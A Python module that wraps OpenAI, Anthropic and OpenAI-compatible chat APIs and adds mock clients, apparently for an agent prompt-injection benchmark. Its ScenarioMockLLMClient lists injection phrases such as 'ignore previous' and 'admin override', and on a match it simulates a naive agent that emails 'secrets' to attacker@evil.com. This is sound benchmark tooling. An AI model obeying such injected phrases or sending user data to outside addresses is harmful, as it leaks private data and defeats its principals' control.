"""
LLM Client wrapper for multiple providers (OpenAI, Anthropic, OpenAI-compatible)
"""
import os
from abc import ABC, abstractmethod
from typing import Dict, List, Optional, Tuple

try:
    import tiktoken
    TIKTOKEN_AVAILABLE = True
except ImportError:
    TIKTOKEN_AVAILABLE = False


class LLMClient(ABC):
    """Abstract base class for LLM clients"""

    def __init__(self, model: str, temperature: float = 0.7):
        self.model = model
        self.temperature = temperature
        self.total_tokens = 0
        self.total_calls = 0

    @abstractmethod
    def call(
        self,
        messages: List[Dict[str, str]],
        max_tokens: Optional[int] = None,
    ) -> Tuple[str, int]:
        """Call the LLM with messages.

        Returns:
            Tuple of (response_text, tokens_used)
        """
        pass

    def get_stats(self) -> Dict[str, int]:
        """Get usage statistics"""
        return {
            "total_calls": self.total_calls,
            "total_tokens": self.total_tokens
        }

    def reset_stats(self):
        """Reset usage statistics"""
        self.total_tokens = 0
        self.total_calls = 0


class OpenAIClient(LLMClient):
    """OpenAI LLM client"""

    def __init__(
        self,
        model: str = "gpt-3.5-turbo",
        temperature: float = 0.7,
        api_key: Optional[str] = None,
        base_url: Optional[str] = None,
    ):
        super().__init__(model, temperature)
        self.api_key = api_key or os.getenv("OPENAI_API_KEY")
        self.base_url = base_url or os.getenv("OPENAI_BASE_URL")

        if not self.api_key:
            raise ValueError("OpenAI API key not found. Set OPENAI_API_KEY environment variable.")

        try:
            import openai
            client_kwargs: Dict = {"api_key": self.api_key}
            if self.base_url:
                client_kwargs["base_url"] = self.base_url
            self.client = openai.OpenAI(**client_kwargs)
        except ImportError:
            raise ImportError("openai package not installed. Run: pip install openai")

    def call(
        self,
        messages: List[Dict[str, str]],
        max_tokens: Optional[int] = None,
    ) -> Tuple[str, int]:
        """Call OpenAI API."""
        try:
            response = self.client.chat.completions.create(
                model=self.model,
                messages=messages,  # type: ignore[arg-type]
                temperature=self.temperature,
                max_tokens=max_tokens,
            )

            content = response.choices[0].message.content or ""
            tokens_used = (
                response.usage.total_tokens if response.usage else 0
            )

            self.total_calls += 1
            self.total_tokens += tokens_used

            return content, tokens_used

        except Exception as e:
            raise RuntimeError(f"OpenAI API call failed: {str(e)}")

    def estimate_tokens(self, text: str) -> int:
        """Estimate token count for text"""
        if TIKTOKEN_AVAILABLE:
            try:
                encoding = tiktoken.encoding_for_model(self.model)
                return len(encoding.encode(text))
            except Exception:
                pass
        # Rough estimation: ~4 chars per token
        return len(text) // 4


class OpenAICompatibleClient(OpenAIClient):
    """Client for OpenAI-compatible APIs (e.g. vLLM, Ollama, LiteLLM, LocalAI).

    This client inherits all behaviour from OpenAIClient but *requires* a
    ``base_url`` so it can point at a third-party endpoint that speaks the
    OpenAI chat-completions protocol.
    """

    def __init__(
        self,
        model: str,
        temperature: float = 0.7,
        api_key: Optional[str] = None,
        base_url: Optional[str] = None,
    ):
        # Resolve base_url: explicit arg > env var
        resolved_base_url = base_url or os.getenv("OPENAI_BASE_URL")
        if not resolved_base_url:
            raise ValueError(
                "base_url is required for OpenAI-compatible providers. "
                "Pass it explicitly or set the OPENAI_BASE_URL environment variable."
            )

        # For compatible endpoints an API key is not always needed; fall back
        # to a dummy value so the openai library doesn't complain.
        resolved_api_key = api_key or os.getenv("OPENAI_API_KEY") or "no-key-required"

        super().__init__(
            model=model,
            temperature=temperature,
            api_key=resolved_api_key,
            base_url=resolved_base_url,
        )


class AnthropicClient(LLMClient):
    """Anthropic Claude client"""

    def __init__(
        self,
        model: str = "claude-3-haiku-20240307",
        temperature: float = 0.7,
        api_key: Optional[str] = None,
    ):
        super().__init__(model, temperature)
        self.api_key = api_key or os.getenv("ANTHROPIC_API_KEY")

        if not self.api_key:
            raise ValueError(
                "Anthropic API key not found. "
                "Set ANTHROPIC_API_KEY environment variable."
            )

        try:
            import anthropic
            self.client = anthropic.Anthropic(api_key=self.api_key)
        except ImportError:
            raise ImportError("anthropic package not installed. Run: pip install anthropic")

    def call(
        self,
        messages: List[Dict[str, str]],
        max_tokens: Optional[int] = None,
    ) -> Tuple[str, int]:
        """Call Anthropic API."""
        # Convert messages to Anthropic format
        system_message = None
        anthropic_messages = []

        for msg in messages:
            if msg["role"] == "system":
                system_message = msg["content"]
            else:
                anthropic_messages.append({
                    "role": msg["role"],
                    "content": msg["content"]
                })

        try:
            kwargs = {
                "model": self.model,
                "messages": anthropic_messages,
                "temperature": self.temperature,
                "max_tokens": max_tokens or 4096
            }

            if system_message:
                kwargs["system"] = system_message

            response = self.client.messages.create(**kwargs)  # type: ignore[arg-type,call-overload]

            content = response.content[0].text  # type: ignore[union-attr]
            # Anthropic returns input_tokens and output_tokens separately
            tokens_used = response.usage.input_tokens + response.usage.output_tokens

            self.total_calls += 1
            self.total_tokens += tokens_used

            return content, tokens_used

        except Exception as e:
            raise RuntimeError(f"Anthropic API call failed: {str(e)}")

    def estimate_tokens(self, text: str) -> int:
        """Estimate token count for text"""
        # Rough estimation: ~4 chars per token
        return len(text) // 4


class MockLLMClient(LLMClient):
    """Mock LLM client for testing (no actual API calls)"""

    def __init__(self, model: str = "mock-model", temperature: float = 0.7):
        super().__init__(model, temperature)
        self.mock_response = "This is a mock response from the LLM."
        self._response_queue: List[str] = []

    def call(
        self,
        messages: List[Dict[str, str]],
        max_tokens: Optional[int] = None,
    ) -> Tuple[str, int]:
        """Return a mock response.

        If a response queue has been set via :meth:`set_mock_responses`, the
        next response is popped from the front of the queue.  When the queue
        is exhausted the static ``mock_response`` is used as a fallback.
        """
        self.total_calls += 1
        tokens_used = 50  # Mock token count
        self.total_tokens += tokens_used

        if self._response_queue:
            response = self._response_queue.pop(0)
        else:
            response = self.mock_response

        return response, tokens_used

    def set_mock_response(self, response: str):
        """Set the mock response"""
        self.mock_response = response

    def set_mock_responses(self, responses: List[str]):
        """Set a queue of mock responses for multi-step interactions.

        Each call to :meth:`call` will pop the next response from the front
        of the list.  Once the queue is empty, subsequent calls fall back to
        the static ``mock_response``.
        """
        self._response_queue = list(responses)


class ScenarioMockLLMClient(MockLLMClient):
    """Mock LLM that generates ReAct-format responses by analysing the prompt.

    Unlike the basic ``MockLLMClient`` which returns a fixed string,
    this client inspects the user message to determine which tool(s)
    to call and produces syntactically valid ReAct output.  This
    allows ``asb evaluate --provider mock`` to produce meaningful
    ASR / BSR metrics without a real LLM.

    Behaviour:
      * On the **first** call it analyses the goal to build an
        ordered queue of tools to invoke.
      * If the conversation contains ``untrusted_content`` with
        injection markers (e.g. "ignore", "attacker@evil.com") it
        simulates a naïve agent that follows the injection.
      * Each subsequent call pops the next tool from the queue.
      * When the queue is empty it emits a ``Final Answer``.
    """

    def __init__(
        self,
        model: str = "scenario-mock",
        temperature: float = 0.7,
    ):
        super().__init__(model=model, temperature=temperature)
        self._tools_queue: List[str] = []
        self._goal_text: str = ""
        self._session_started: bool = False

    # ------------------------------------------------------------------ #
    # LLMClient interface
    # ------------------------------------------------------------------ #

    def call(
        self,
        messages: List[Dict[str, str]],
        max_tokens: Optional[int] = None,
    ) -> Tuple[str, int]:
        # If a manual response queue was set, honour it first.
        if self._response_queue:
            return super().call(messages, max_tokens)

        self.total_calls += 1
        tokens_used = 50
        self.total_tokens += tokens_used

        user_msg = self._latest_user_message(messages)

        # First call in session: plan all tools needed.
        if not self._session_started:
            self._session_started = True
            self._goal_text = user_msg
            self._tools_queue = self._plan_tools(user_msg)

        # Pop next tool from queue, or emit Final Answer.
        if self._tools_queue:
            tool_name = self._tools_queue.pop(0)
            return self._tool_action(tool_name), tokens_used

        return self._final_answer(), tokens_used

    # ------------------------------------------------------------------ #
    # Planning: analyse goal to build tool queue
    # ------------------------------------------------------------------ #

    def _plan_tools(self, user_msg: str) -> List[str]:
        """Determine all tools the agent should call, in order."""
        lower = user_msg.lower()

        # Check for injection markers first.
        injection_markers = [
            "ignore previous",
            "ignore all",
            "forget all previous",
            "forward all",
            "send to attacker",
            "attacker@",
            "evil.com",
            "override",
            "system prompt",
            "system message",
            "admin override",
            "updated task",
            "instruction change",
            "action required by system",
            "debug mode enabled",
            "elevated privileges",
            "automated workflow",
            "disregard",
            "urgent addendum",
            "assistant override",
        ]
        has_marker = any(m in lower for m in injection_markers)

        # Also detect external emails + action verbs as
        # injection (covers social engineering attacks).
        import re

        ext_emails = [
            e for e in re.findall(
                r"[\w.+-]+@[\w-]+\.[\w.-]+", lower,
            )
            if not e.endswith(
                ("@company.com", "@example.com")
            )
        ]
        action_verbs = [
            "send", "email to", "forward to",
            "write to", "mail to",
        ]
        has_external_action = (
            bool(ext_emails)
            and any(v in lower for v in action_verbs)
        )

        if has_marker or has_external_action:
            return ["__inject__"]

        tools: List[str] = []

        # Email tools
        if "email" in lower:
            if "list" in lower:
                tools.append("list_emails")
            # read_email if any email ID or generic "read email"
            if "read" in lower or "email_" in lower:
                tools.append("read_email")
            if "send" in lower or "reply" in lower or "forward" in lower:
                tools.append("send_email")
            # If only "email" but no specific verb, default to read
            if not tools:
                tools.append("read_email")

        # File tools
        if (
            "file" in lower
            or ".csv" in lower
            or ".txt" in lower
            or "/data/" in lower
            or "/docs/" in lower
            or "/tmp/" in lower
        ):
            # Read first, write second (if both needed)
            if (
                "read" in lower
                or "csv" in lower
                or "summarize" in lower
                or "calculate" in lower
                or "/data/" in lower
                or "/docs/" in lower
            ):
                tools.append("read_file")
            if (
                "write" in lower
                or "save" in lower
                or "create" in lower and "file" in lower
            ):
                tools.append("write_file")
            if not tools:
                tools.append("read_file")

        # Search
        if "search" in lower:
            tools.append("search_web")

        # Document creation
        if "document" in lower or (
            "create" in lower and "titled" in lower
        ):
            tools.append("create_document")

        # Deduplicate while preserving order
        seen: set = set()
        unique: List[str] = []
        for t in tools:
            if t not in seen:
                seen.add(t)
                unique.append(t)

        return unique

    # ------------------------------------------------------------------ #
    # Action generators
    # ------------------------------------------------------------------ #

    def _tool_action(self, tool_name: str) -> str:
        """Generate a ReAct action for a specific tool."""
        lower = self._goal_text.lower()

        if tool_name == "__inject__":
            target = self._extract_injection_target(self._goal_text)
            return (
                "Thought: The content says I should forward "
                "data. I will comply.\n"
                "Action: send_email\n"
                f'Action Input: {{"to": "{target}", '
                '"subject": "data", "body": "secrets"}'
            )

        if tool_name == "list_emails":
            return (
                "Thought: I need to list emails.\n"
                "Action: list_emails\n"
                "Action Input: {}"
            )

        if tool_name == "read_email":
            eid = self._extract_email_id(lower)
            return (
                "Thought: I need to read the email.\n"
                "Action: read_email\n"
                f'Action Input: {{"email_id": "{eid}"}}'
            )

        if tool_name == "send_email":
            return (
                "Thought: I need to send an email.\n"
                "Action: send_email\n"
                'Action Input: {"to": "team@company.com", '
                '"subject": "Re: request", '
                '"body": "Done as requested."}'
            )

        if tool_name == "read_file":
            fpath = self._extract_file_path(lower)
            return (
                "Thought: I need to read the file.\n"
                "Action: read_file\n"
                f'Action Input: {{"path": "{fpath}"}}'
            )

        if tool_name == "write_file":
            return (
                "Thought: I need to write a file.\n"
                "Action: write_file\n"
                'Action Input: {"path": "/tmp/output.txt", '
                '"content": "Generated content."}'
            )

        if tool_name == "search_web":
            query = self._extract_search_query(lower)
            return (
                "Thought: I need to search the web.\n"
                "Action: search_web\n"
                f'Action Input: {{"query": "{query}"}}'
            )

        if tool_name == "create_document":
            title = self._extract_doc_title(lower)
            return (
                "Thought: I need to create a document.\n"
                "Action: create_document\n"
                f'Action Input: {{"title": "{title}", '
                f'"content": "Generated document content."}}'
            )

        # Fallback
        return (
            "Thought: I can answer this directly.\n"
            "Final Answer: Task completed successfully."
        )

    # ------------------------------------------------------------------ #
    # Helpers
    # ------------------------------------------------------------------ #

    @staticmethod
    def _latest_user_message(messages: List[Dict[str, str]]) -> str:
        for msg in reversed(messages):
            if msg.get("role") == "user":
                return msg.get("content", "")
        return ""

    @staticmethod
    def _extract_injection_target(text: str) -> str:
        """Extract the target email from injection text."""
        import re

        # Find email addresses in the text that aren't common
        # internal ones (company.com, etc.)
        all_emails = re.findall(
            r"[\w.+-]+@[\w-]+\.[\w.-]+", text
        )
        # Prefer external/suspicious-looking addresses
        for email in all_emails:
            if email.endswith(
                ("@company.com", "@example.com")
            ):
                continue
            return email
        return "attacker@evil.com"

    @staticmethod
    def _extract_email_id(text: str) -> str:
        import re

        match = re.search(r"email[_\s]?(\d+)", text)
        if match:
            return f"email_{match.group(1).zfill(3)}"
        return "email_001"

    @staticmethod
    def _extract_file_path(text: str) -> str:
        import re

        match = re.search(r"(/[\w/]+\.[\w]+)", text)
        if match:
            return match.group(1)
        return "/docs/readme.txt"

    @staticmethod
    def _extract_search_query(text: str) -> str:
        import re

        match = re.search(r"['\"]([^'\"]+)['\"]", text)
        if match:
            return match.group(1)
        return "information"

    @staticmethod
    def _extract_doc_title(text: str) -> str:
        import re

        match = re.search(r"titled\s+['\"]([^'\"]+)['\"]", text)
        if match:
            return match.group(1)
        return "Document"

    @staticmethod
    def _final_answer() -> str:
        return (
            "Thought: I have completed all the steps. "
            "Let me summarise.\n"
            "Final Answer: Task completed. "
            "Here is the summary of the result."
        )

    def reset_session(self) -> None:
        """Reset per-session state (call between benchmark cases)."""
        self._tools_queue = []
        self._goal_text = ""
        self._session_started = False


def create_llm_client(
    provider: str = "openai",
    model: Optional[str] = None,
    **kwargs,
) -> LLMClient:
    """
    Factory function to create LLM client.

    Args:
        provider: "openai", "anthropic", "openai-compatible", or "mock"
        model: Model name (optional, uses defaults if not provided)
        **kwargs: Additional arguments for the client

    Returns:
        LLMClient instance
    """
    if provider == "openai":
        model = model or "gpt-3.5-turbo"
        return OpenAIClient(model=model, **kwargs)
    elif provider == "anthropic":
        model = model or "claude-3-haiku-20240307"
        return AnthropicClient(model=model, **kwargs)
    elif provider == "openai-compatible":
        if not model:
            raise ValueError("model is required for openai-compatible provider")
        return OpenAICompatibleClient(model=model, **kwargs)
    elif provider == "mock":
        return ScenarioMockLLMClient(
            model=model or "scenario-mock", **kwargs,
        )
    else:
        raise ValueError(
            f"Unknown provider: {provider}. "
            "Use 'openai', 'anthropic', 'openai-compatible', or 'mock'"
        )


# Example usage
if __name__ == "__main__":
    # Test with mock client (no API key needed)
    print("Testing Mock LLM Client...")
    client = create_llm_client("mock")

    messages = [
        {"role": "system", "content": "You are a helpful assistant."},
        {"role": "user", "content": "What is 2+2?"}
    ]

    response, tokens = client.call(messages)
    print(f"Response: {response}")
    print(f"Tokens: {tokens}")
    print(f"Stats: {client.get_stats()}")

    # Test multi-step mock responses
    print("\nTesting multi-step mock responses...")
    mock_client = MockLLMClient()
    mock_client.set_mock_responses([
        "Step 1: Thinking...",
        "Step 2: Processing...",
        "Step 3: Done!",
    ])
    for i in range(4):
        resp, _ = mock_client.call(messages)
        print(f"  Call {i+1}: {resp}")

    # Uncomment to test with real API (requires API key)
    # print("\nTesting OpenAI Client...")
    # client = create_llm_client("openai", temperature=0.7)
    # response, tokens = client.call(messages)
    # print(f"Response: {response}")
    # print(f"Tokens: {tokens}")
